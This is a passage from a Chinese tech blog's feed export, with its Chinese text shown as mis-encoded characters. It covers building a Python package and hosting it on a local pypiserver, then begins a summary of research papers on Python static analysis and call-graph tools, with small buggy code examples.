ç†è§£ä¸ºåŒ…å« <code>setup.py</code> å‘½ä»¤é»˜è®¤é€‰é¡¹çš„ ini æ–‡ä»¶ã€‚</p><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>Ubuntu 20.04 Serverï¼ˆPython 3.8.10ï¼‰å®‰è£… <code>venv</code>ï¼Œåˆ›å»ºå¹¶ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv /home/jck/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> /home/jck/code/bin/activate</span><br></pre></td></tr></table></figure><h2 id="ç”ŸæˆåŒ…"><a href="#ç”ŸæˆåŒ…" class="headerlink" title="ç”ŸæˆåŒ…"></a>ç”ŸæˆåŒ…</h2><p>ä½¿ç”¨ä»¥ä¸‹ <code>setup.py</code> é…ç½®æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.md&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">    long_description = fh.read()</span><br><span class="line"></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">&quot;my_project&quot;</span>,</span><br><span class="line">    version=<span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">    author=<span class="string">&quot;jckling&quot;</span>,</span><br><span class="line">    author_email=<span class="string">&quot;jckling@163.com&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;A small example package&quot;</span>,</span><br><span class="line">    long_description=long_description,</span><br><span class="line">    long_description_content_type=<span class="string">&quot;text/markdown&quot;</span>,</span><br><span class="line">    url=<span class="string">&quot;https://github.com/jckling&quot;</span>,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    packages=setuptools.find_packages(),</span><br><span class="line">    python_requires=<span class="string">&quot;&gt;=3.6&quot;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å®‰è£… <code>setuptools</code> å’Œ <code>wheel</code>ï¼Œæ”¯æŒä»æºç æ„å»ºåŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install setuptools</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>è¿›å…¥ packaging æ–‡ä»¶å¤¹ï¼Œæ£€æŸ¥ <code>setup.py</code>ï¼Œå¦‚æœæœ‰é”™è¯¯ä¼šæ‰“å°æç¤ºä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python setup.py check</span><br><span class="line"><span class="comment"># running check</span></span><br></pre></td></tr></table></figure><p>æ‰“åŒ…ï¼Œè‡ªåŠ¨åˆ›å»º <code>dist</code> ç›®å½•ï¼Œä»¥åŠç›¸åº”çš„ <code>.tar.gz</code> æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py sdist build</span><br></pre></td></tr></table></figure><script id="asciicast-Bhy00w92CAhOkpHz8o11aOpVL" src="https://asciinema.org/a/Bhy00w92CAhOkpHz8o11aOpVL.js" async></script><h1 id="æœ¬åœ°-PyPI-æœåŠ¡å™¨æ­å»º"><a href="#æœ¬åœ°-PyPI-æœåŠ¡å™¨æ­å»º" class="headerlink" title="æœ¬åœ° PyPI æœåŠ¡å™¨æ­å»º"></a>æœ¬åœ° PyPI æœåŠ¡å™¨æ­å»º</h1><h2 id="æ­å»ºæœåŠ¡å™¨"><a href="#æ­å»ºæœåŠ¡å™¨" class="headerlink" title="æ­å»ºæœåŠ¡å™¨"></a>æ­å»ºæœåŠ¡å™¨</h2><p>å®‰è£… <code>pypiserver</code>ï¼Œåˆ›å»ºæ–‡ä»¶å¤¹ <code>packages</code> ç”¨äºæ”¾ç½®å‘å¸ƒçš„åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pypiserver</span><br><span class="line">mkdir ~/packages</span><br></pre></td></tr></table></figure><p>å°† <code>my_project-0.0.1.tar.gz</code> ä¸Šä¼ åˆ° <code>~/packages</code> ç›®å½•ä¸‹ï¼Œåœ¨åŒä¸€å°è™šæ‹Ÿæœºä¸Šæ“ä½œç›´æ¥ä½¿ç”¨ <code>mv</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv dist/my_project-0.0.1.tar.gz ~/packages</span><br></pre></td></tr></table></figure><p>è¿è¡ŒæœåŠ¡å™¨ï¼Œç«¯å£æŒ‡å®šä¸º <code>8080</code>ï¼Œ é»˜è®¤ç›‘å¬æ‰€æœ‰ IP åœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypi-server -p 8080 ~/packages &amp;</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>æœç´¢æœ¬åœ°æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰ <code>my_project</code> åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip search --index http://localhost:8080 my_project</span><br></pre></td></tr></table></figure><p>å®‰è£…å’Œä½¿ç”¨ <code>my_project</code> åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --extra-index-url http://localhost:8080 my_project</span><br></pre></td></tr></table></figure><script id="asciicast-PTCdzI2ZPbmelUTBpgcS8kVHA" src="https://asciinema.org/a/PTCdzI2ZPbmelUTBpgcS8kVHA.js" async></script><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://pythonguidecn.readthedocs.io/zh/latest/writing/structure.html">ç»“æ„åŒ–æ‚¨çš„å·¥ç¨‹</a></li><li><a href="https://packaging.python.org/tutorials/packaging-projects/">Packaging Python Projects</a></li><li><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/">Packaging and distributing projects</a></li><li><a href="https://choosealicense.com/">Choose a License</a></li><li><a href="https://docs.python.org/zh-cn/3/library/index.html">Python æ ‡å‡†åº“</a></li><li><a href="https://testerhome.com/articles/27052">æµ‹è¯•å¼€å‘æŠ€æœ¯ å®æˆ˜æ•™ç¨‹ï¼šå¦‚ä½•å°†è‡ªå·±çš„ Python åŒ…å‘å¸ƒåˆ° PyPI ä¸Š</a></li><li><a href="https://github.com/kennethreitz/setup.py/blob/master/setup.py">kennethreitz/setup.py</a></li><li><a href="https://www.jianshu.com/p/c260b59cd3d0">åŸºäº pypiserver çš„ PyPI ç§æœ‰ä»“åº“æ­å»ºå®è·µ</a></li><li><a href="https://github.com/pypiserver/pypiserver">pypiserver/pypiserver</a></li></ul>]]></content>
    
    
    <summary type="html">ä½¿ç”¨ pypiserver æ­å»ºæœ¬åœ°æœåŠ¡å™¨</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python é™æ€åˆ†æç›¸å…³è®ºæ–‡</title>
    <link href="https://jckling.github.io/2021/07/28/Notes/Python%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/"/>
    <id>https://jckling.github.io/2021/07/28/Notes/Python%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/</id>
    <published>2021-07-28T11:01:13.000Z</published>
    <updated>2021-10-11T13:39:04.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¿»äº†å‡ ç¯‡ Python é™æ€åˆ†æç›¸å…³çš„è®ºæ–‡ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆæ¯”è¾ƒå¥½çš„åˆ†æå·¥å…·ã€‚</p><h2 id="é™æ€åˆ†æå·¥å…·"><a href="#é™æ€åˆ†æå·¥å…·" class="headerlink" title="é™æ€åˆ†æå·¥å…·"></a>é™æ€åˆ†æå·¥å…·</h2><h3 id="1-Survey-on-Static-Analysis-Tools-of-Python-Programs"><a href="#1-Survey-on-Static-Analysis-Tools-of-Python-Programs" class="headerlink" title="1. Survey on Static Analysis Tools of Python Programs"></a>1. Survey on Static Analysis Tools of Python Programs</h3><blockquote><p>SQAMIA 2019</p></blockquote><p>æ¦‚è¿°äº† Python ä»£ç åº“é™æ€åˆ†æçš„ç°æœ‰æ–¹æ³•å’Œå·¥å…·ï¼Œå¹¶ä»‹ç»äº†ä¸€äº›æ–°çš„ç ”ç©¶æ–¹å‘ã€‚</p><p>æ€»ç»“äº†å¸¸è§çš„ Python é™æ€åˆ†æå·¥å…·ä¹‹é—´çš„å…³ç³»ï¼Œç®€å•ä»‹ç»äº†ï¼ˆå‡ è¡Œæ¦‚è¿°ï¼‰ <a href="https://github.com/PyCQA/pylint">Pylint</a>ã€<a href="https://github.com/PyCQA/pyflakes">Pyflakes</a>ã€<a href="https://github.com/PyCQA/flake8">flake8</a>ã€<a href="https://github.com/timothycrosley/deprecated.frosted">Frosted</a>ã€<a href="https://github.com/PyCQA/pycodestyle">Pycodestyle</a>ã€<a href="https://github.com/python/mypy">Mypy</a>ã€<a href="https://github.com/bjodah/pysym">PySym</a>ã€<a href="https://github.com/thomasjball/PyExZ3">PyExZ3</a>ã€‚</p><img src="https://i.loli.net/2021/07/29/qpvM1iYNFXhLgTe.jpg" style="zoom:70%;" /><p>è®¾è®¡å¹¶æµ‹è¯•äº† 6 ç§å…¸å‹çš„é€»è¾‘æ¼æ´ï¼ˆlogical errorsï¼‰ï¼Œç”¨ PyLintã€Pyflakesã€Flake8ã€Mypyã€Frosted æ£€æµ‹</p><ul><li>ä½¿ç”¨é»˜è®¤é…ç½®</li><li>é€»è¾‘é”™è¯¯ä¼šäº§ç”Ÿæ„å¤–çš„è¾“å‡ºæˆ–ç»“æœï¼Œä½†ä¸ä¸€å®šä¼šå¯¼è‡´å´©æºƒ</li></ul><img src="https://i.loli.net/2021/07/29/G1Q8ETPtCyKoSxA.png" style="zoom:70%;" /><ol><li><p>å¼•ç”¨æœªå®šä¹‰å˜é‡</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">message = <span class="string">&quot;Hello there!&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;greetMe&quot;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">print(mesage) <span class="comment"># å˜é‡åæ‰“é”™</span></span><br><span class="line">print(<span class="string">&quot;This code is fine, no problems.&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>å¤ªå¤šä½ç½®å‚æ•°</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys <span class="comment"># æœªä½¿ç”¨çš„å¯¼å…¥</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, first_name, last_name, age</span>):</span></span><br><span class="line">        self.first_name = first_name</span><br><span class="line">        self.last_name = last_name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Windows&quot;</span> <span class="keyword">in</span> platform.platform(): <span class="comment"># æœªå®šä¹‰çš„ platform å˜é‡</span></span><br><span class="line">    print(<span class="string">&quot;Youâ€™ re using Windows !&quot;</span>)</span><br><span class="line"></span><br><span class="line">    self.age = self.getAge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment"># å¤ªå¤šä½ç½®å‚æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAge</span>(<span class="params">this</span>):</span> <span class="comment"># æ²¡æœ‰ self å‚æ•°</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;18&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>ä¼ é€’ç±»å‹é”™è¯¯çš„å‚æ•°</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">x:<span class="built_in">int</span>, y:<span class="built_in">int</span></span>):</span> <span class="comment"># ç±»å‹æ³¨é‡Š</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">print(<span class="built_in">sum</span>(<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">sum</span>(<span class="number">3</span>, <span class="string">&quot;4&quot;</span>)) <span class="comment"># ä¼ é€’é”™è¯¯ç±»å‹çš„å‚æ•°</span></span><br></pre></td></tr></table></figure></li><li><p>å¼•ç”¨ä¸å­˜åœ¨çš„ç±»å±æ€§</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">PERSON1 = Person(<span class="string">&quot;Hristina&quot;</span>, <span class="number">23</span>)</span><br><span class="line">print(PERSON1.age)</span><br><span class="line">print(PERSON1.height) <span class="comment"># å¼•ç”¨ä¸å­˜åœ¨çš„å±æ€§</span></span><br></pre></td></tr></table></figure></li><li><p>è°ƒç”¨åµŒå¥—å‡½æ•°</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    x=<span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        print(x)</span><br><span class="line">    inner()</span><br><span class="line">outer()</span><br><span class="line">inner() <span class="comment"># è°ƒç”¨ outer å†…éƒ¨å®šä¹‰çš„å‡½æ•°</span></span><br></pre></td></tr></table></figure></li><li><p>é—­åŒ…é”™è¯¯</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é—­åŒ…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    x = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        y = <span class="number">3</span></span><br><span class="line">        result = x + y</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line">a = outer()</span><br><span class="line">print(a()) <span class="comment"># è°ƒç”¨ inner()</span></span><br><span class="line">print(a.__name__) <span class="comment"># æ‰“å° inner</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é—­åŒ…é”™è¯¯ï¼Œéé¢„æœŸç»“æœ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet</span>(<span class="params">greet_word, name</span>) :</span></span><br><span class="line">print(greet_word, name)</span><br><span class="line">greeters = <span class="built_in">list</span>()</span><br><span class="line">names = [<span class="string">&quot;Kiki&quot;</span>, <span class="string">&quot;Riki&quot;</span>, <span class="string">&quot;Joe&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">greeters.append(<span class="keyword">lambda</span> x : greet(x, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> greeter <span class="keyword">in</span> greeters:</span><br><span class="line">greeter(<span class="string">&quot;Hi&quot;</span>)</span><br><span class="line"><span class="comment"># æ‰“å°</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-Towards-More-Sophisticated-Static-Analysis-Methods-of-Python-Programs"><a href="#2-Towards-More-Sophisticated-Static-Analysis-Methods-of-Python-Programs" class="headerlink" title="2. Towards More Sophisticated Static Analysis Methods of Python Programs"></a>2. Towards More Sophisticated Static Analysis Methods of Python Programs</h3><blockquote><p>Informatics 2019 â€¢ IEEE 15th International Scientific Conference on Informatics</p></blockquote><p>å’Œä¸Šä¸€ç¯‡åŒæ ·çš„ä½œè€…ï¼Œæ¢è®¨äº†ä¸º Python å¼€å‘æ›´å¼ºå¤§çš„é™æ€åˆ†æå·¥å…·çš„å¯èƒ½ç ”ç©¶æ–¹å‘ã€‚</p><p>æ€»ç»“ç°æœ‰çš„é™æ€åˆ†ææ–¹æ³•ï¼šæ¨¡å¼åŒ¹é…ã€AST åŒ¹é…ã€ç¬¦å·æ‰§è¡Œã€æ··åˆæ‰§è¡Œã€‚å¯¹æ¯”åŸºäº AST çš„ Pylint å’Œå®éªŒæ€§çš„ç¬¦å·æ‰§è¡Œå·¥å…· mini-mcï¼ˆä½¿ç”¨ Z3 çº¦æŸæ±‚è§£å™¨çš„ Python æ¥å£ï¼‰</p><ul><li>4 ä¸ªä»£ç ç‰‡æ®µæµ‹è¯• mini-mc çš„æ£€æµ‹èƒ½åŠ›ï¼Œå…¶ä¸­ 2 ä¸ªç‰‡æ®µç”¨äºæ¯”è¾ƒ</li></ul><table><thead><tr><th></th><th>Pylint</th><th>mini-mc</th></tr></thead><tbody><tr><td>å¼•ç”¨æœªå®šä¹‰å˜é‡</td><td>x</td><td>âˆš</td></tr><tr><td>å¯èƒ½çš„é™¤é›¶å¼‚å¸¸ï¼ˆè¯¯æŠ¥ï¼‰</td><td>x</td><td>âˆš</td></tr></tbody></table><ol><li><p>å¼•ç”¨æœªå®šä¹‰å˜é‡</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>== arg):</span><br><span class="line">        print(<span class="string">&quot;branch11 &quot;</span>, os.getpid())</span><br><span class="line">        z = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>!=arg):</span><br><span class="line">        print(<span class="string">&quot;branch21 &quot;</span>, os.getpid())</span><br><span class="line">        x = z</span><br><span class="line"></span><br><span class="line">arg = BitVec(arg, <span class="number">32</span>)</span><br><span class="line">func(arg)</span><br></pre></td></tr></table></figure></li><li><p>å¯èƒ½çš„é™¤é›¶å¼‚å¸¸</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> arg == <span class="number">41</span> :</span><br><span class="line">    print(<span class="string">&quot;branch21 &quot;</span>, os.getpid())</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># è¾“å…¥ä¸º 42 æ—¶ç¡®å®ä¼šå¼•èµ·å¼‚å¸¸ï¼Œä½†å…¶ä»–æƒ…å†µä¸‹æ²¡æœ‰é—®é¢˜</span></span><br><span class="line">        print(<span class="string">&quot;branch22 &quot;</span>, os.getpid())</span><br><span class="line">        z = arg - <span class="number">42</span></span><br><span class="line">        z = <span class="number">99</span> / z</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-Static-Value-Analysis-of-Python-Programs-by-Abstract-Interpretation"><a href="#3-Static-Value-Analysis-of-Python-Programs-by-Abstract-Interpretation" class="headerlink" title="3. Static Value Analysis of Python Programs by Abstract Interpretation"></a>3. Static Value Analysis of Python Programs by Abstract Interpretation</h3><blockquote><p>NASA Formal Methods Symposium</p></blockquote><p>é€šè¿‡ <strong>æŠ½è±¡è§£é‡Š</strong> æ¨æ–­å˜é‡ç±»å‹ã€è¿è¡Œæ—¶é”™è¯¯å’Œæœªæ•è·å¼‚å¸¸ï¼Œåªæ”¯æŒä¸€å°éƒ¨åˆ†å†…ç½®å¯¹è±¡å’Œæ ‡å‡†åº“çš„åˆ†æã€‚</p><h2 id="è°ƒç”¨å›¾å·¥å…·"><a href="#è°ƒç”¨å›¾å·¥å…·" class="headerlink" title="è°ƒç”¨å›¾å·¥å…·"></a>è°ƒç”¨å›¾å·¥å…·</h2><h3 id="1-Empirical-Study-of-Python-Call-Graph"><a href="#1-Empirical-Study-of-Python-Call-Graph" class="headerlink" title="1. Empirical Study of Python Call Graph"></a>1. Empirical Study of Python Call Graph</h3><blockquote><p>2019 34th IEEE/ACM International Conference on Automated Software Engineering (ASE)</p></blockquote><p>å¯¹ç°æœ‰çš„ Python ç¨‹åºè°ƒç”¨å›¾ç”Ÿæˆå·¥å…·è¿›è¡Œæ¯”å¯¹ï¼ˆ<a href="https://github.com/davidfraser/pyan">Pyan</a>ã€<a href="https://github.com/scottrogowski/code2flow">Code2flow</a>ã€<a href="https://github.com/gak/pycallgraph">Pycallgraph</a>ã€Understandï¼‰ï¼Œä»¥ Pycallgraph ä½œä¸ºåŸºå‡†ï¼Œç”¨å¸¸è§çš„æ¨¡å—æºä»£ç è¿›è¡Œæµ‹è¯•ï¼ˆscikit-learnã€theanoã€networkxã€numbaã€joblibã€pandasï¼‰</p><ul><li>Pyanã€Code2flowã€Pycallgraphï¼ˆ6 å¹´å‰åœæ›´ï¼‰ï¼šGithub å¼€æºå·¥å…·</li><li>Understandï¼šå•†ä¸šè½¯ä»¶</li></ul><p>é’ˆå¯¹ pandas æ¨¡å—ï¼Œå„ä¸ªå·¥å…·ç”Ÿæˆçš„éšå¼èŠ‚ç‚¹æ•°ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é€ æˆäº†ç»“æœçš„å·¨å¤§å·®å¼‚ã€‚</p><img src="https://i.loli.net/2021/07/29/nzaZEiHlMJWAuwc.jpg" style="zoom:70%;" /><p>ç»“è®ºï¼šç°æœ‰çš„ Python é™æ€è°ƒç”¨å›¾å·¥å…·åœ¨æ„å»ºæ•ˆæœä¸Šå­˜åœ¨è¾ƒå¤§å·®å¼‚ï¼Œä»æœ‰æ”¹è¿›çš„ç©ºé—´ã€‚</p><h3 id="2-PyCG-Practical-Call-Graph-Generation-in-Python"><a href="#2-PyCG-Practical-Call-Graph-Generation-in-Python" class="headerlink" title="2. PyCG: Practical Call Graph Generation in Python"></a>2. PyCG: Practical Call Graph Generation in Python</h3><blockquote><p>2021 IEEE/ACM 43rd International Conference on Software Engineering (ICSE)</p></blockquote><p>æå‡ºäº†ä¸€ç§å®ç”¨çš„ã€é™æ€çš„ Python è°ƒç”¨å›¾ç”Ÿæˆæ–¹æ³•ã€‚æ¶‰åŠä¸Šä¸‹æ–‡æ•æ„Ÿçš„è¿‡ç¨‹é—´åˆ†æï¼Œä¸åŠ¨ç‚¹è¿­ä»£ç®—æ³•ç­‰ã€‚æ²¡æœ‰åˆ†æå¾ªç¯å’Œæ¡ä»¶è¯­å¥ï¼Œä¹Ÿä¸ä½¿ç”¨å˜é‡ç±»å‹ä¿¡æ¯ï¼Œåªèƒ½åˆ†ææœ‰æºç çš„æ¨¡å—ã€‚</p><p>ç¼–å†™å¦‚ä¸‹ crypto æ¨¡å—è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cryptops</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apply</span>(<span class="params">self, msg, func</span>):</span></span><br><span class="line"><span class="keyword">return</span> func(self.key, msg)</span><br><span class="line"></span><br><span class="line">crp = Crypto(<span class="string">&quot;secretkey&quot;</span>)</span><br><span class="line">encrypted = crp.apply(<span class="string">&quot;hello world&quot;</span>, cryptops.encrypt)</span><br><span class="line">decrypted = crp.apply(encrypted, cryptops.decrypt)</span><br></pre></td></tr></table></figure><p>(a) æ˜¯å®é™…çš„è°ƒç”¨å›¾ï¼ˆäººå·¥ç»˜åˆ¶ï¼‰ï¼Œ(b) Pyan æ²¡æœ‰è¿›è¡Œè¿‡ç¨‹é—´åˆ†æï¼Œ(c) Depends çš„ç­–ç•¥éå¸¸ä¿å®ˆï¼Œåªæœ‰é¢„æœŸä¿¡æ¯è¶³å¤Ÿæ‰ç”Ÿæˆè°ƒç”¨è¾¹</p><img src="https://i.loli.net/2021/07/29/eoSfyqKCXFDuZwh.jpg" style="zoom:70%;" /><p>ä½¿ç”¨ PyCG åˆ†æ crypto æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°å®Œæ•´ä¸”æ­£ç¡®çš„åç§°è§£æå’Œè°ƒç”¨</p><ul><li>æ©™è‰²ï¼šæ¨¡å—</li><li>çº¢è‰²ï¼šç±»</li><li>é»‘è‰²ï¼šå‡½æ•°</li><li>è“è‰²ï¼šå˜é‡</li></ul><img src="https://i.loli.net/2021/07/29/O7IoGZtEjwXup3A.jpg" style="zoom:70%;" /><p>å¾®è§‚åŸºå‡†æµ‹è¯•å¥—ä»¶ï¼ˆMicro-benchmark Suiteï¼‰åŒ…å« 112 ä¸ªç‹¬ç‰¹çš„å°å‹ä»£ç ï¼Œæ¶µç›– Python 